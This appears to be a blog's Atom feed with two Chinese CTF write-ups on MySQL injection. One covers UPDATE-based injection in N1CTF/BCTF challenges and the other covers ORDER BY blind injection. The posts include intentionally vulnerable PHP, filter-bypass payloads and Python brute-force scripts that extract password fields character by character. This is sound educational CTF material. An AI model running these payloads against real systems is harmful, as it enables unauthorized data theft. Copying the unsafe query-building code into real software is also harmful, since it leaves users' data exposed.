<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>JWYBlog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://ju5tw4nty0u.top/"/>
  <updated>2018-04-24T11:47:12.983Z</updated>
  <id>http://ju5tw4nty0u.top/</id>
  
  <author>
    <name>ju5tw4nty0u</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>mysql之利用update进行注入</title>
    <link href="http://ju5tw4nty0u.top/2018/04/24/mysql%E4%B9%8B%E5%88%A9%E7%94%A8update%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5/"/>
    <id>http://ju5tw4nty0u.top/2018/04/24/mysql之利用update进行注入/</id>
    <published>2018-04-24T06:02:15.000Z</published>
    <updated>2018-04-24T11:47:12.983Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近比赛挺多的，但是太菜了每次都没能做出题目，只能在赛后看看wp，然后学习一下师傅们的新姿势，今天主要讲的是N1CTF的两道题目还有BCTF的一个题目，这三个题目算是同一个题目的三个版本吧，每个版本都过滤了很多东西，使得注入的过程变得艰难（还是自己太菜23333</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>1、在vps搭建复现环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$p = $_POST[&apos;flag&apos;];</span><br><span class="line">$points = $_POST[&apos;hi&apos;];</span><br><span class="line">// echo &quot;提交的flag为：&quot;;</span><br><span class="line">// echo $p;</span><br><span class="line">// echo &apos;&lt;br /&gt;&apos;;</span><br><span class="line">// echo &quot;提交的hi为：&quot;;</span><br><span class="line">// echo $points;</span><br><span class="line">// echo &apos;&lt;br /&gt;&apos;;</span><br><span class="line"></span><br><span class="line">$dbhost = &apos;localhost&apos;;  // mysql服务器主机地址</span><br><span class="line">$dbuser = &apos;root&apos;;            // mysql用户名</span><br><span class="line">$dbpass = &apos;*********&apos;;          // mysql用户名密码</span><br><span class="line">$conn1 = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn1 )</span><br><span class="line">&#123;</span><br><span class="line">    die(&apos;连接失败: &apos; . mysqli_error($conn1));</span><br><span class="line">&#125;</span><br><span class="line">// 设置编码，防止中文乱码</span><br><span class="line">mysqli_query($conn1 , &quot;set names utf8&quot;);</span><br><span class="line">$sql1 = sprintf(&quot;UPDATE users SET points=%d%s&quot;,$p,$points);</span><br><span class="line">// echo &quot;当前执行的sql语句为：&quot;;</span><br><span class="line">// echo $sql1;</span><br><span class="line">echo &apos;&lt;br /&gt;&apos;;</span><br><span class="line">mysqli_select_db( $conn1, &apos;sqli&apos; );</span><br><span class="line">$retval1 = mysqli_query( $conn1, $sql1 );</span><br><span class="line"></span><br><span class="line">if(! $retval1 )</span><br><span class="line">&#123;</span><br><span class="line">    die(&apos;无法更新数据: &apos; . mysqli_error($conn1));</span><br><span class="line">&#125;</span><br><span class="line">// echo &apos;数据更新成功！&apos;;</span><br><span class="line">// echo &apos;&lt;br /&gt;&apos;;</span><br><span class="line">mysqli_close($conn1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$conn2 = mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">$sql2 = &apos;select points from users where username = &quot;admin&quot;&apos;;</span><br><span class="line">// echo $sql2;</span><br><span class="line">// echo &apos;&lt;br /&gt;&apos;;</span><br><span class="line">mysqli_select_db( $conn2, &apos;sqli&apos; );</span><br><span class="line">$retval2 = mysqli_query( $conn2, $sql2 );</span><br><span class="line">while($row = mysqli_fetch_array($retval2, MYSQLI_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;数据库中points值为：&quot;;</span><br><span class="line">    echo &quot;&#123;$row[&apos;points&apos;]&#125;&quot;;</span><br><span class="line">    echo &apos;&lt;br /&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($conn2);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>2、插入测试数据<br><img src="/2018/04/24/mysql之利用update进行注入/cesi1.png" alt="beida"><br>3、我们可以看到sql语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql1 = sprintf(&quot;UPDATE users SET points=%d%s&quot;,$p,$points);</span><br></pre></td></tr></table></figure></p><p>通过<code>update</code>更新<code>points</code>字段的值，然后回显在页面上，这里提交的两个参数<code>$p</code>和<code>$points</code>拼接成<code>%d%s</code>,因为<code>%d</code>会将传入的参数值转换成int型，如果从这个参数进行注入的话没办法构造完整的sql语句，这里把重点放在<code>$points</code>这个参数，通过构造完整的sql语句来实现对<code>password</code>字段的flag进行获取。</p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="7777777-v1"><a href="#7777777-v1" class="headerlink" title="7777777 v1"></a>7777777 v1</h2><p>这里参考了一叶飘零师傅的一篇文章<br><a href="http://skysec.top/2018/03/12/N1CTF-2018-Web/" target="_blank" rel="noopener">http://skysec.top/2018/03/12/N1CTF-2018-Web/</a><br>通过使用mysql的模糊查询来匹配符合条件的字符，然后拼接再次匹配，直到匹配完成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set points=1111 where password like 0x25;</span><br></pre></td></tr></table></figure></p><p><img src="/2018/04/24/mysql之利用update进行注入/cesi2.png" alt="beida"><br>这里的0x25表示的是%，在模糊查询中表示匹配所有，在这里是将数据库中users表的points字段全部改成1111</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set points=2222 where password like 0x6625;</span><br></pre></td></tr></table></figure><p><img src="/2018/04/24/mysql之利用update进行注入/cesi3.png" alt="beida"><br>这里的0x6625表示的是f%,即匹配以f开头的password的值，然后修改其对应的points为2222，以此类推，我们可以爆破出所有password字段的值，从而获取flag。<br>这里附上自己修改过的脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">def get_content(payload1):</span><br><span class="line">data = &#123;</span><br><span class="line">&apos;flag&apos;:5201314,</span><br><span class="line">&apos;hi&apos;: payload1</span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url=url,data=data)</span><br><span class="line">return res.text</span><br><span class="line"></span><br><span class="line">def comeback(payload2):</span><br><span class="line">data = &#123;</span><br><span class="line">&apos;flag&apos;:1313,</span><br><span class="line">&apos;hi&apos;: payload2</span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url=url,data=data)</span><br><span class="line">return &apos;comeback&apos;</span><br><span class="line"></span><br><span class="line">url = &apos;http://your_vps_ip_add/index.php&apos;</span><br><span class="line">Tflag = &apos;&apos;</span><br><span class="line">#hex</span><br><span class="line">Rflag = &apos;&apos;</span><br><span class="line">payload1 = &apos;&apos;</span><br><span class="line">payload2 = &quot; where password like 0x25&quot;</span><br><span class="line">comeback(payload2)</span><br><span class="line">for i in range(1,50):</span><br><span class="line">yes = 0</span><br><span class="line">for j in &quot;0123456789&quot;+string.letters+&quot;!@#$^&amp;*()&#123;&#125;=+`~_&quot;:</span><br><span class="line">payload1 = r&quot; where password like 0x&#123;&#125;25&quot;.format(Tflag+hex(ord(j))[2:])</span><br><span class="line">#print payload1</span><br><span class="line">if &quot;5201314&quot; in get_content(payload1):</span><br><span class="line">Tflag += hex(ord(j))[2:]</span><br><span class="line">Rflag += str(j)</span><br><span class="line">print Rflag</span><br><span class="line">comeback(payload2)</span><br><span class="line">yes = 1</span><br><span class="line">break</span><br><span class="line">if yes == 0:</span><br><span class="line">print &quot;flag is find,congratulation!!!!&quot;</span><br><span class="line">break </span><br><span class="line"></span><br><span class="line">print Rflag</span><br></pre></td></tr></table></figure></p><p>后来又搜了一下别的师傅的wp，发现还有好多新姿势，下面介绍一下这些另一种角度的解法吧<br>1、参考了<a href="https://blog.csdn.net/littlelittlebai/article/details/79535569" target="_blank" rel="noopener">https://blog.csdn.net/littlelittlebai/article/details/79535569</a><br>通过构造payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag=0&amp;hi=|conv(hex(substr((select password),1,1)),16,10)</span><br></pre></td></tr></table></figure></p><p><img src="/2018/04/24/mysql之利用update进行注入/way1.png" alt="beida"><br><img src="/2018/04/24/mysql之利用update进行注入/way1_1.png" alt="beida"><br>将查询到的password值做切割，每次取其中的一位，然后与我们所提交的points的值做|运算，结果能够得到这一位值的ascii值，从而得到flag。</p><p>2、参考了<a href="http://seaii-blog.com/index.php/2018/03/12/78.html" target="_blank" rel="noopener">http://seaii-blog.com/index.php/2018/03/12/78.html</a><br>通过构造payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">通过&amp;&amp;运算构造条件，根据得到的points值进行盲注，从而得到结果</span><br><span class="line">flag=0&amp;hi=1 &amp;&amp; password&lt;&quot;A&quot;</span><br><span class="line"></span><br><span class="line">通过查询结果的切片转换返回页面回显</span><br><span class="line">flag=0&amp;hi=%2b(select hex(mid((select a.password from (select password from users) a),1,1)))</span><br></pre></td></tr></table></figure></p><p>至于这里为什么需要嵌套一个查询可以参考<br><a href="https://blog.csdn.net/priestmoon/article/details/8016121" target="_blank" rel="noopener">https://blog.csdn.net/priestmoon/article/details/8016121</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql中You can&apos;t specify target table &lt;tbl&gt; for update in FROM clause错误的意思是说，不能先select出同一表中的某些值，再update这个表(在同一语句中)。也就是说将select出的结果再通过中间表select一遍，这样就规避了错误。注意，这个问题只出现于mysql，mssql和oracle不会出现此问题。</span><br></pre></td></tr></table></figure></p><p>暂时就知道了这些姿势，如果以后遇到了新姿势在更新23333由此也可以看出注入的思路在每个人看来都是不太一样的，是一种很灵活的题目，不一定要走别人的路，因为到达目的地的路不止一条。</p><h2 id="7777777-v2"><a href="#7777777-v2" class="headerlink" title="7777777 v2"></a>7777777 v2</h2><p>看了师傅们的博客后知道这题把like等一些关键字都过滤了，还过滤了部分数字，但是有一些符号还保留着，所以就有一下几种思路：<br>1、payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag=110&amp;hi= +(password &gt; &apos;fp&apos;)</span><br></pre></td></tr></table></figure></p><p><img src="/2018/04/24/mysql之利用update进行注入/cesi4.png" alt="beida"><br><img src="/2018/04/24/mysql之利用update进行注入/cesi5.png" alt="beida"><br>我们可以看到当<code>password&gt;&#39;fl&#39;</code>成立时，points的值加1并更新成功，而当<code>password&gt;&#39;fm&#39;</code>不成立时，points的值更新为3333，我们可以利用这种方法得到符合的值</p><p>2、payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">依然可以用7777777 v1的</span><br><span class="line">flag=0&amp;hi=|conv(hex(substr((select password),1,1)),16,10)</span><br></pre></td></tr></table></figure></p><p>不过过滤了数字2、3、4、5、9，我们怎么才能绕过？<br>（1）、使用length函数   length(‘11’)=2 …..<br> (2)、使用运算  1+1=2 7-1-1-1-1-1=2 …..<br> (3)、可以用二进制来绕过    00000010</p><h2 id="7777777-v3"><a href="#7777777-v3" class="headerlink" title="7777777 v3"></a>7777777 v3</h2><p>这是BCTF上的题目，也正是看到这题之后去找了相关资料，大概了解解题思路后，便开始了尝试，结果发现和自己想象的完全不一样，测试过滤的过程总是能困扰我很久，以至于最后放弃解题，看了师傅们的wp后，深感自己能力还是差了很多，也借此鼓励一下自己，不放弃，平凡但不甘于平庸的自己。<br>这里参考了<a href="http://blog.kingkk.com/2018/04/bctf2018-love-q/" target="_blank" rel="noopener">http://blog.kingkk.com/2018/04/bctf2018-love-q/</a>这篇文章<br>1、分析题目过滤了很多东西</p><ul><li>数字只有2和9能用</li><li>比较符号除了&gt;其余包括等号和小于号都被过滤了</li><li>页面没有回显</li><li>时间盲注的sleep函数和benchmark函数都被禁用了<br><img src="/2018/04/24/mysql之利用update进行注入/cesi6.png" alt="beida"><br>2、分析源码<br><img src="/2018/04/24/mysql之利用update进行注入/cesi7.png" alt="beida"><br>当sql语句执行出错时，会输出sorry，那么我们使用语法正确但是无法执行的语句会怎么样呢？<br>这里可以构造<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">slect pow(2,22222222222);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &apos;pow(2,222222222)&apos;</span><br></pre></td></tr></table></figure></li></ul><p>利用次方运算导致数据超出double长度时就会报错，但是不执行该语句时语法上是没问题的,这里短路运算符用不了，但是留了一个if,所以可以构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select if(1,1,pow(2,222222222));//条件为真</span><br><span class="line"></span><br><span class="line">select if(0,1,pow(2,222222222));//条件为假</span><br></pre></td></tr></table></figure></p><p><img src="/2018/04/24/mysql之利用update进行注入/cesi8.png" alt="beida"><br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag=2</span><br><span class="line"></span><br><span class="line">hi=&gt;&gt;if((substr(pw,(9-2-2-2-2),(9-2-2-2-2))&gt;&apos;a&apos;),2,pow(22,222222222222)</span><br></pre></td></tr></table></figure></p><ul><li>只能用&gt;进行比较运算, 于是前面的连接符就用&gt;&gt;位运算来做，后面判断勉强用 &gt; 也能找到对应字符</li><li>数字只有2和9，运算符只有 * 和  – ，于是用（9-2-2-2-2）可以构造1，有了1和2，其他的数字应该也可以自行构造了<br>判断依据：<br>语句为真时无回显（2&gt;&gt;2=0），语句为false（语法正确无法执行）时，输出sorry，就可以用来当作盲注的判断点<br>这里就直接贴师傅的脚本了（自动化构造数字较难）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#encoding=utf8</span><br><span class="line">import requests, string</span><br><span class="line">str_range = string.ascii_letters</span><br><span class="line">url = &quot;http://3a7b823fc7994d62a92c3589fd05273b1254bc38b97743f2.game.ichunqiu.com&quot;</span><br><span class="line"></span><br><span class="line">for i in str_range:</span><br><span class="line">data = dict(flag=2,hi=&quot;&gt;&gt;if((substr(pw,2*2*2*2*2-9-2,(9-2-2-2-2))&gt;&apos;&#123;&#125;&apos;),2,pow(22,222222222222))&quot;.format(i))</span><br><span class="line">r = requests.post(url, data=data)</span><br><span class="line">if &apos;sorry&apos; in r.text:</span><br><span class="line">print(&apos;sorry&apos;,i)</span><br><span class="line">elif &apos;hacker&apos; in r.text:</span><br><span class="line">print(&quot;hacker&quot;)</span><br><span class="line">else:</span><br><span class="line">print(&quot;yes&quot;,i)</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2018/04/24/mysql之利用update进行注入/juxian.png" alt="beida"></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>在自己心里一直有一些疑问，实际情况中users表的值可能存在多个，如果直接按照字母来排序这种方法来解题可能会得到错误的结果，有时候大小写也会混淆了解题的一些想法，所以可能有时候有一些方法还是有局限性的，只能自己在这条路上慢慢摸索了，如果看到此文的师傅们有更好的答案，非常欢迎也希望能帮忙解答一下这些疑惑QAQ。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近比赛挺多的，但是太菜了每次都没能做出题目，只能在赛后看看wp，然后学习一下师傅们的新姿势，今天主要讲的是N1CTF的两道题目还有BCTF
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ju5tw4nty0u.top/tags/CTF/"/>
    
      <category term="SQL" scheme="http://ju5tw4nty0u.top/tags/SQL/"/>
    
      <category term="WP" scheme="http://ju5tw4nty0u.top/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>mysql之利用order by排序进行注入</title>
    <link href="http://ju5tw4nty0u.top/2018/04/19/mysql%E4%B9%8B%E5%88%A9%E7%94%A8order-by%E6%8E%92%E5%BA%8F%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5/"/>
    <id>http://ju5tw4nty0u.top/2018/04/19/mysql之利用order-by排序进行注入/</id>
    <published>2018-04-19T05:00:55.000Z</published>
    <updated>2018-04-19T08:14:06.388Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>突然发现更新完sqli基础关之后自己已经好久没有更新博客了，刚好最近又遇到了一些之前困扰了好久的问题，当时还不怎么理解sql注入，然后看了wp（安恒杯2月月赛-进击的盲注）还是看不懂，就记录一下吧（都怪自己太懒了23333<br><img src="/2018/04/19/mysql之利用order-by排序进行注入/beida.jpg" alt="beida"></p><h1 id="搭建测试环境"><a href="#搭建测试环境" class="headerlink" title="搭建测试环境"></a>搭建测试环境</h1><p>1、这里我直接在vps上面复现了一下题目<br>源码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">/*index.php*/</span><br><span class="line">&lt;?php</span><br><span class="line">  $dbhost = &quot;localhost&quot;;</span><br><span class="line">  $dbuser = &quot;root&quot;;</span><br><span class="line">  $dbpass = &quot;*********&quot;;/*这里是你的数据库密码*/</span><br><span class="line">  $db = &quot;sqli&quot;;</span><br><span class="line">  $conn = mysqli_connect($dbhost,$dbuser,$dbpass,$db);</span><br><span class="line">  mysqli_set_charset($conn,&quot;utf8&quot;);</span><br><span class="line"> </span><br><span class="line">  /* sql</span><br><span class="line">     create  table `admin` (</span><br><span class="line">        `id` int(10) not null primary key auto_increment,</span><br><span class="line">        `username` varchar(20) not null ,</span><br><span class="line">        `password` varchar(32) not null</span><br><span class="line">     );</span><br><span class="line">  */</span><br><span class="line">function   filter($str)&#123;</span><br><span class="line">      $filterlist = &quot;/\(|\)|username|password|where|</span><br><span class="line">      case|when|like|regexp|into|limit|=|for|;/&quot;;</span><br><span class="line">      if(preg_match($filterlist,strtolower($str)))&#123;</span><br><span class="line">        die(&quot;illegal input!&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      return $str;</span><br><span class="line">  &#125;</span><br><span class="line">$username = isset($_POST[&apos;username&apos;])?</span><br><span class="line">filter($_POST[&apos;username&apos;]):die(&quot;please input username!&quot;);</span><br><span class="line">$password = isset($_POST[&apos;password&apos;])?</span><br><span class="line">filter($_POST[&apos;password&apos;]):die(&quot;please input password!&quot;);</span><br><span class="line">$sql = &quot;select * from admin where  username =</span><br><span class="line"> &apos;$username&apos; and password = &apos;$password&apos; &quot;;</span><br><span class="line"> </span><br><span class="line">$res = $conn -&gt; query($sql);</span><br><span class="line">if($res-&gt;num_rows&gt;0)&#123;</span><br><span class="line">  $row = $res -&gt; fetch_assoc();</span><br><span class="line">  if($row[&apos;id&apos;])&#123;</span><br><span class="line">     echo $row[&apos;username&apos;];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">   echo &quot;The content in the password column is the flag!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>2、如果你也想本地复现的话，只要修改数据库的相关信息，然后放到站点目录访问即可。</p><h1 id="题目详解"><a href="#题目详解" class="headerlink" title="题目详解"></a>题目详解</h1><p>1、从源码我们可以得到许多数据库相关的信息（库名、表名、字段），但是我们定位到关键的filter函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function   filter($str)&#123;</span><br><span class="line">      $filterlist = &quot;/\(|\)|username|password|where|</span><br><span class="line">      case|when|like|regexp|into|limit|=|for|;/&quot;;</span><br><span class="line">      if(preg_match($filterlist,strtolower($str)))&#123;</span><br><span class="line">        die(&quot;illegal input!&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      return $str;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>这里发现过滤了<code>&quot;(、)、username、password、where、      case、when、like、regexp、into、limit、=、for、;</code>等关键字，所以一般的盲注可能行不通，这里我们通过order by盲注得到flag</p><p>2、从源码容易得到注入点在username处，通过构造<code>username=&#39;^1^1#&amp;password=123</code>,利用异或条件使查询条件永远为真，得到回显值<code>admin</code><br><img src="/2018/04/19/mysql之利用order-by排序进行注入/huixian.png" alt="huixian"></p><p>3、所以我们构造payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://vps_ip/orderbysqli_test/index.php</span><br><span class="line">post:</span><br><span class="line">username=admin&apos; union select 1,2,&#123;&#125; order by 3#&amp;password=123</span><br></pre></td></tr></table></figure></p><p>获取flag的脚本如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def sqli(payload):</span><br><span class="line">url = &quot;http://vps_ip/orderbysqli_test/index.php&quot;</span><br><span class="line">#这里是你的复现地址</span><br><span class="line">data = &#123;&apos;username&apos;:payload,&apos;password&apos;:&apos;123&apos;&#125;</span><br><span class="line">res = requests.post(url,data = data)</span><br><span class="line">#print res.text</span><br><span class="line">return res.text</span><br><span class="line"></span><br><span class="line">username = &quot;admin&apos;union select 1,2,0x&#123;&#125; order by 3 desc#&quot;</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for i in range (1,50):</span><br><span class="line">n = 0 </span><br><span class="line">for j in range (33,127):</span><br><span class="line">#print chr(j)</span><br><span class="line">n += 1</span><br><span class="line">payload = username.format((flag+chr(j)).encode(&apos;hex&apos;))</span><br><span class="line">#print payload</span><br><span class="line">if &apos;admin&apos; not in sqli(payload):</span><br><span class="line">flag = flag + chr(j-1)</span><br><span class="line">print flag</span><br><span class="line">break</span><br><span class="line">if n == 94:</span><br><span class="line">print &apos;find is over&apos;</span><br><span class="line">print flag</span><br><span class="line">break</span><br></pre></td></tr></table></figure></p><p>4、运行脚本我们得到的结果是:<br><img src="/2018/04/19/mysql之利用order-by排序进行注入/flag1.png" alt="flag1"><br>对比了一下数据库里面的flag<br><img src="/2018/04/19/mysql之利用order-by排序进行注入/flag2.png" alt="flag2"><br>我们可以发现大小写没有区分导致得到错误的结果，那么这里我们可以用binary那实现大小写的区分<br>只需要修改payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username = &quot;admin&apos;union select 1,2,binray 0x&#123;&#125; order by 3 desc#&quot;</span><br></pre></td></tr></table></figure></p><p>得到的结果与数据库一致，解决了大小写不敏感的问题<br><img src="/2018/04/19/mysql之利用order-by排序进行注入/flag3.png" alt="flag3"><br>但是这里我们发现最后一个字符是错误的，这里我们在数据库里面进行了尝试<br><img src="/2018/04/19/mysql之利用order-by排序进行注入/lianggepaixu.png" alt="liangepaixu"><br>当我们同时对password和username排序时，查询的结果是正确的<br><img src="/2018/04/19/mysql之利用order-by排序进行注入/flag8.png" alt="flag8"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def sqli(payload):</span><br><span class="line">url = &quot;http://vps_ip/orderbysqli_test/index.php&quot;</span><br><span class="line">data = &#123;&apos;username&apos;:payload,&apos;password&apos;:&apos;123&apos;&#125;</span><br><span class="line">res = requests.post(url,data = data)</span><br><span class="line">#print res.text</span><br><span class="line">return res.text</span><br><span class="line"></span><br><span class="line">username = &quot;admin&apos;union select 1,&apos;b&apos;,binary 0x&#123;&#125; order by 3,2 desc#&quot;</span><br><span class="line">#shengxu</span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for i in range (1,50):</span><br><span class="line">n = 0 </span><br><span class="line">for j in range (33,127):</span><br><span class="line">#print chr(j)</span><br><span class="line">n += 1</span><br><span class="line">payload = username.format((flag+chr(j)).encode(&apos;hex&apos;))</span><br><span class="line">#print payload</span><br><span class="line">if &apos;admin&apos; in sqli(payload):</span><br><span class="line">flag = flag + chr(j-1)</span><br><span class="line">print flag</span><br><span class="line">break</span><br><span class="line">if n == 94:</span><br><span class="line">print &apos;find is over&apos;</span><br><span class="line">print flag</span><br><span class="line">break</span><br></pre></td></tr></table></figure></p><h1 id="原理介绍"><a 